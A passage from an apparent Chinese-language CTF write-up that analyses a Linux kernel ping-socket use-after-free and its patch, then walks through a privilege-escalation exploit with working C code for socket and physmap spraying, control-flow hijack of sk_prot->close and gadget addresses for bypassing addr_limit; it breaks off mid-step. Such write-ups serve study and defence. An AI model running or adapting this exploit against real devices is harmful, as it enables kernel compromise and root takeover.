hlist_nulls_node *n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> =</span> n-&gt;next;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> =</span> n-&gt;pprev;</span><br><span class="line">	*pprev = next;</span><br><span class="line">	<span class="keyword">if</span> (!is_a_nulls(next))</span><br><span class="line">		next-&gt;pprev = pprev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>关于链表删除时为什么将<code>node-&gt;pprev</code>赋值为<code>LIST_POISON2</code>，文章 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/z2007b/article/details/6370383" >linux双向链表分析之list_del中的技巧</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 中说是为了方便调试的目的。</p>
<p><code>hlist_nulls_del()</code>后是<code>sock_put()</code>，该函数在sk无引用后，调用<code>sk_free()</code>释放sk节点。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sock_put</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (atomic_dec_and_test(&amp;sk-&gt;sk_refcnt))</span><br><span class="line">		sk_free(sk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调试显示，第一次指定“sa.sin_family = AF_UNSPEC”调用connect(sock, (const struct sockaddr *) &amp;sa, sizeof(sa))时，sk-&gt;sk_refcnt的值为2，不会进入sk_free。</span></span><br><span class="line"><span class="comment">// 第二次调用connect进入该分支时，（mmap 0x200200/0x1360 后），sk-&gt;sk_refcnt为1，将进入sk_free()流程</span></span><br></pre></td></tr></table></div></figure>
<p>以上流程走第一遍的时候没什么问题，但走第二遍时，由于<code>sk-&gt;sk_node-&gt;pprev</code>为非零值（0x200200/0x1360），因此会进入<code>if(sk_hashed(sk))</code>分支，然后顺序执行<code>hlist_nulls_del(&amp;sk-&gt;sk_nulls_node)</code> 和 <code>sock_put(sk)</code>。当执行到如下代码片段时，由于<code>n-&gt;pprev</code>为<code>0x200200/0x1360</code>，导致<code>*pprev = next</code>发生非法地址访问，内核crash。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __hlist_nulls_del(struct hlist_nulls_node *n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> =</span> n-&gt;next;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> =</span> n-&gt;pprev;</span><br><span class="line">	*pprev = next;</span><br></pre></td></tr></table></div></figure>
<p>如果在访问该非法地址前，先合法映射<code>0x200200/0x1360</code>这块地址区域，就不会在此处发生内核crash。然后，会继续执行<code>sock_put(sk)</code>，此时<code>sk-&gt;sk_refcnt</code>为1（调试发现），因此会执行<code>sk_free(sk)</code>操作。虽然<code>sk</code>已释放，但用户态依然可以通过已打开的socket文件描述符访问<code>sk</code>中的数据，于是产生了UAF。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/a134f083e79fb4c3d0a925691e732c56911b4326?diff=split" >漏洞patch</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 在删除链表节点和释放sk函数之间新增了一个函数<code>sk_nulls_node_init</code>，将<code>sk-&gt;sk_node-&gt;pprev</code>置为0，则无法二次进入<code>if (sk_hashed(sk))</code>分支触发UAF。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*		hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span></span><br><span class="line"><span class="comment">		sk_nulls_node_init(&amp;sk-&gt;sk_nulls_node);</span></span><br><span class="line"><span class="comment">		sock_put(sk);		*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sk_nulls_node_init</span><span class="params">(struct hlist_nulls_node *node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node-&gt;pprev = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h1 id="漏洞利用"   >
          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1>
      
        <h2 id="总体思路"   >
          <a href="#总体思路" class="heading-link"><i class="fas fa-link"></i></a><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2>
      <p>利用思路分为如下6个步骤：</p>
<p>1、<strong>physmap spray</strong>：劫持函数指针<code>sk-&gt;_sk_common-&gt;skc_prot-&gt;close</code></p>
<blockquote>
<ul>
<li>内核态堆内存：用户态创建大量socket连接，利用漏洞产生kmalloc UAF</li>
<li>用户态mmap内存：mmap大量内存，并以页为单位进行标记</li>
<li>两者在物理内存中可能存在重叠，因此重点变成了，如何找到mmap page与socket的重合呢？</li>
<li>socket有一个特殊的ioctl cmd，叫SIOCGSTAMPNS。它将返回sk-&gt;偏移0x1D8处的值。于是，只要在mmap时为每个PAGE做特殊标记，便能定位到哪些mmap page和socket会重合。</li>
<li>而close(fd)时会用到sk-&gt;偏移0x28处的函数指针，因此改目标mmap_page其偏移0x28处的值，就能实现内核控制流劫持了！</li>
</ul>
</blockquote>
<p>2、<strong>改进程addr_limit</strong>：任意内核地址读写</p>
<blockquote>
<ul>
<li>kernel_setsockopt()函数，控制跳过setfs(oldfs)这行代码。</li>
<li>使用pipe系统调用，对任意内核地址读写</li>
</ul>
</blockquote>
<p>3、<strong>关闭selinux</strong>：利用任意内核读写来关闭selinux</p>
<p>4、<strong>获取cred/real_cred地址</strong></p>
<blockquote>
<ul>
<li>泄露当前进程task_struct结构体的地址</li>
<li>根据cred/real_cred在task_struct中的偏移，获取cred/real_cred结构体的地址</li>
</ul>
</blockquote>
<p>5、<strong>进程提权</strong></p>
<blockquote>
<ul>
<li>将cred结构体中uid,gid,suid,sgid,euid,egid,fsuid,fsgid全部置零</li>
</ul>
</blockquote>
<p>6、<strong>稳定shell</strong></p>

        <h2 id="步骤1-physmap-spray"   >
          <a href="#步骤1-physmap-spray" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤1-physmap-spray" class="headerlink" title="步骤1. physmap spray"></a>步骤1. physmap spray</h2>
      <ul>
<li><p>UAF socket spray</p>
<p>由于需要创建大量socket，因此首先改掉linux rlimit对打开文件数量的限制，即RLIMIT_NOFILE（能打开的文件数目）。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maximize_fd_limit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	</span><br><span class="line">	ret = getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line">	<span class="comment">//printf(&quot;rlim.rlim_cur: 0x%x, rlim.rlim_max:0x%x\n&quot;,rlim.rlim_cur,rlim.rlim_max);</span></span><br><span class="line"></span><br><span class="line">	rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">	setrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line"></span><br><span class="line">	ret = getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line">	<span class="keyword">return</span> rlim.rlim_cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>然后申请socket，并调用两次connect产生UAF。需要绕过POC中非法地址访问（真实场景中时0x200200，本题中是0x1360），将该地址做一次映射即可。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//global 	</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_VULTRIG_SOCKS_COUNT           4000</span></span><br><span class="line"><span class="keyword">int</span>   vultrig_socks[MAX_VULTRIG_SOCKS_COUNT];</span><br><span class="line"><span class="comment">//global </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i;	<span class="comment">// for-loop</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr1</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr2</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;addr1,<span class="number">0</span>,<span class="keyword">sizeof</span>(addr1));</span><br><span class="line">	<span class="built_in">memset</span>(&amp;addr2,<span class="number">0</span>,<span class="keyword">sizeof</span>(addr2));</span><br><span class="line">	addr1.sin_family = AF_INET;</span><br><span class="line">	addr2.sin_family = AF_UNSPEC;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] set RLIMIT_NOFILE\n&quot;</span>);</span><br><span class="line">	maximize_fd_limit();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] socket prepare...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;MAX_VULTRIG_SOCKS_COUNT; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		vultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line">		connect(vultrig_socks[i], &amp;addr1, <span class="keyword">sizeof</span>(addr1));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// avoid error: Unable to handle kernel paging request at virtual address 00001360</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] mmap 0x1000-0x2000...\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo 4096 &gt; /proc/sys/vm/mmap_min_addr&quot;</span>);</span><br><span class="line">	<span class="keyword">void</span>* user_mm = mmap((<span class="keyword">void</span> *)<span class="number">0x1000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">memset</span>((<span class="keyword">char</span> *)user_mm,<span class="number">0x90</span>,<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] generate vuln sockets...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;MAX_VULTRIG_SOCKS_COUNT; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br><span class="line">		connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>mmap spray</p>
<p>考虑到性能，将mmap的size设置得尽量大。经过测试，一次mmap <code>150*1024*1024</code>大小是可以的。</p>
<p>应当如何给mmap_page做标记呢？取决于使用socket的何种特性。</p>
<p><code>struct sock</code>结构体中有一个成员<code>ktime_t sk_stamp</code>，用户态可以通过<code>struct timespec time;  ioctl(exp_sock, SIOCGSTAMPNS, &amp;time)</code>读取到它的转换结果。64位系统下调用过程见《socket的inet_ioctl》章节内容。</p>
<p>通过分析题目的Image镜像，确定sk-&gt;sk_stamp的偏移是0x1D8。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sock_get_timestampns</span><span class="params">(__int64 a1, _QWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// x0</span></span><br><span class="line">  __int64 v5; <span class="comment">// x1</span></span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line">  __int64 real; <span class="comment">// x0</span></span><br><span class="line">  __int64 v10; <span class="comment">// x1</span></span><br><span class="line">  __int64 v11; <span class="comment">// [xsp+0h] [xbp+0h] BYREF</span></span><br><span class="line">  __int64 v12; <span class="comment">// [xsp+20h] [xbp+20h] BYREF</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+28h] [xbp+28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (*(_QWORD *)(a1 + <span class="number">200</span>) &amp; <span class="number">0x80</span>) == <span class="number">0</span> )</span><br><span class="line">    sock_enable_timestamp(a1, <span class="number">7</span>i64);</span><br><span class="line">  v4 = ns_to_timespec(*(_QWORD *)(a1 + <span class="number">0x1D8</span>));</span><br></pre></td></tr></table></div></figure>
<p>因此，我们在mmap的每一个mmap_page中，偏移0x1D8的位置，写入一个8字节的magic number。代码如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// global</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE			  4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_VALUE 			  0x4B5F5F4B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PHYSMAP_SIZE                  120*1024*1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PHYSMAP_SPRAY_PROCESS         5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* physmap_spray_pages[(MAX_PHYSMAP_SIZE / PAGE_SIZE) * MAX_PHYSMAP_SPRAY_PROCESS];</span><br><span class="line"><span class="keyword">int</span>   physmap_spray_pages_count;</span><br><span class="line"><span class="comment">// global</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">physmap_spray_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">void</span>* mapped;</span><br><span class="line">	<span class="keyword">void</span>* mapped_page;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(physmap_spray_pages,<span class="number">0</span>,<span class="keyword">sizeof</span>(physmap_spray_pages));</span><br><span class="line">	physmap_spray_pages_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_PHYSMAP_SPRAY_PROCESS; i++)&#123;</span><br><span class="line">		mapped = mmap(<span class="literal">NULL</span>, MAX_PHYSMAP_SIZE , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">memset</span>((<span class="keyword">char</span> *)mapped,<span class="number">0x41</span>,MAX_PHYSMAP_SIZE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; MAX_PHYSMAP_SIZE/PAGE_SIZE; j++)&#123;</span><br><span class="line">			mapped_page = (<span class="keyword">void</span>*)((<span class="keyword">char</span>*)mapped + PAGE_SIZE*j);</span><br><span class="line">			*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)mapped_page+<span class="number">0x1D8</span>) = MAGIC_VALUE + physmap_spray_pages_count;</span><br><span class="line">			physmap_spray_pages[physmap_spray_pages_count] = mapped_page;</span><br><span class="line">			physmap_spray_pages_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>find exploitable socket and mmap_page</p>
<p>对每一个socket，遍历mmap_page，找到timestamp一致的两个对象。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search_exploitable_socket</span><span class="params">(<span class="keyword">int</span>* index, <span class="keyword">void</span>** payload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>    <span class="title">timespec</span> <span class="title">time</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>  value;</span><br><span class="line">    <span class="keyword">void</span>*     page     =  <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span>       j        =  <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>       exp_sock = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span>       got      =  <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        exp_sock = vultrig_socks[*index];</span><br><span class="line">        <span class="built_in">memset</span>(&amp;time, <span class="number">0</span>, <span class="keyword">sizeof</span>(time));</span><br><span class="line">        ioctl(exp_sock, SIOCGSTAMPNS, &amp;time);</span><br><span class="line">        value = ((<span class="keyword">uint64_t</span>)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; physmap_spray_pages_count; j++)&#123;</span><br><span class="line">            page = physmap_spray_pages[j];</span><br><span class="line">            <span class="keyword">if</span>(value == *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)page + <span class="number">0x1D8</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] magic:%p\n&quot;</span>, value);</span><br><span class="line">                got = <span class="number">1</span>;</span><br><span class="line">                *payload = page;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;hit the mmap page : 0x%x\n&quot;</span>,j);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        *index = *index + <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">while</span>(!got &amp;&amp; *index &lt; MAX_VULTRIG_SOCKS_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(got == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> exp_sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line">	<span class="keyword">int</span> exp_sock,exp_sock_index;</span><br><span class="line">	<span class="keyword">void</span>* payload;</span><br><span class="line"></span><br><span class="line">	exp_sock_index = <span class="number">0</span>;</span><br><span class="line">	exp_sock = search_exploitable_socket(&amp;exp_sock_index,&amp;payload);</span><br><span class="line">	<span class="keyword">if</span>(exp_sock == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;cannot find target socket\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;find it 1!!! exp_sock_index: 0x%x\n&quot;</span>,exp_sock_index);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></div></figure>

</li>
<li><p>hijack <code>sk-&gt;sk_prot-&gt;close</code></p>
<p><code>struct sock</code>结构体中有许多函数指针，其中<code>sk-&gt;sk_prot-&gt;close</code>在<code>close(fd)</code>时会通过<code>sock_close()</code> -&gt; <code>sock_release()</code> -&gt; <code>inet_release()</code>调用到。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now struct inet_timewait_sock also uses sock_common, so please just</span></span><br><span class="line"><span class="comment">	 * don&#x27;t add nothing before this first member (__sk_common) --acme</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_common</span>	__<span class="title">sk_common</span>;</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">define</span> sk_prot			__sk_common.skc_prot</span></span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_common</span> &#123;</span></span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">proto</span>		*<span class="title">skc_prot</span>;</span></span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span>			(*close)(struct sock *sk,</span><br><span class="line">					<span class="keyword">long</span> timeout);</span><br><span class="line">	<span class="keyword">int</span>			(*connect)(struct sock *sk,</span><br><span class="line">					struct sockaddr *uaddr,</span><br><span class="line">					<span class="keyword">int</span> addr_len);</span><br><span class="line">	<span class="comment">//.......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>inet_release函数中，<code>sk-&gt;sk_prot-&gt;close(sk, timeout)</code>对应的汇编代码如下，<code>sk-&gt;sk_prot-&gt;close</code>中sk_prot（即__sk_common.skc_prot）距离sock起始地址的偏移量是0x28。从该地址取出的值即close()函数起始地址。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROM:FFFFFFC0003FEA20 loc_FFFFFFC0003FEA20                    ; CODE XREF: inet_release+90↓j</span><br><span class="line">ROM:FFFFFFC0003FEA20                                         ; inet_release+98↓j</span><br><span class="line">ROM:FFFFFFC0003FEA20                 STR             XZR, [X20,#0x20]</span><br><span class="line">ROM:FFFFFFC0003FEA24                 MOV             X0, X19</span><br><span class="line">ROM:FFFFFFC0003FEA28                 LDR             X2, [X19,#0x28]</span><br><span class="line">ROM:FFFFFFC0003FEA2C                 LDR             X2, [X2]</span><br><span class="line">ROM:FFFFFFC0003FEA30                 BLR             X2</span><br></pre></td></tr></table></div></figure>
<p>因此，上一步骤找到满足条件的socket和mmap_page之后，覆盖mmap_page偏移0x28位置处的8个字节地址指向的内容，就能实现控制流劫持了！</p>
</li>
</ul>
<p>该步骤的源码参考：<a href="step1.c">步骤1的源码</a></p>
<p>编译完成后，通过adb push到虚拟机中，执行结果如下图所示，成功劫持pc。</p>
<p><img   src="image-20220918180540313.png?size=600" style="width: 600px;"  alt="image-20220918180540313"></p>

        <h2 id="步骤2-改进程addr-limit"   >
          <a href="#步骤2-改进程addr-limit" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤2-改进程addr-limit" class="headerlink" title="步骤2. 改进程addr_limit"></a>步骤2. 改进程addr_limit</h2>
      <ul>
<li><p>扩大进程addr limit访问空间</p>
<p>用户态进程陷入内核态后，通过set_fs(KERNEL_DS)将本进程可访问地址限制设为0xFFFFFFFFFFFFFFFF，于是当前进程可访问到所有虚拟内存地址。在目标功能完成后，通过set_fs(oldfs)将限制重新设置为原来的大小。它们在内核代码中通常是成对出现的。</p>
<p>kernel_setsockopt()函数（<em>函数地址为0xFFFFFFC00035D788</em>）中调用了set_fs(KERNEL_DS)，并且通过适当设置寄存器可以跳过setfs(oldfs)这行代码。《addr limit访问限制》章节中“kernel_setsockopt”小节，详细说明了本题的利用方法。</p>
<p>发生控制流劫持时，x0的值为sock的地址，[x0,#0x28]处存的还是sock地址，所以x5也是sock地址。因此将[x5,#0x68]处存上0xFFFFFFC00035D7C0，相当于给mmap_page+0x68处存上这个值。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROM:FFFFFFC00035D7B0                 LDR             X5, [X0,#0x28]</span><br><span class="line">ROM:FFFFFFC00035D7B4                 LDR             X5, [X5,#0x68]</span><br><span class="line">ROM:FFFFFFC00035D7B8                 BLR             X5</span><br><span class="line">ROM:FFFFFFC00035D7BC                 STR             X20, [X19,#8]</span><br><span class="line">ROM:FFFFFFC00035D7C0                 LDP             X19, X20, [SP,#var_s10]</span><br></pre></td></tr></table></div></figure>
<p>在步骤1执行close(exp_sock)之前，布置好将要使用到的值。使其执行kernel_setsockopt()函数，并跳过set_fs(oldfs)这一句。</p>
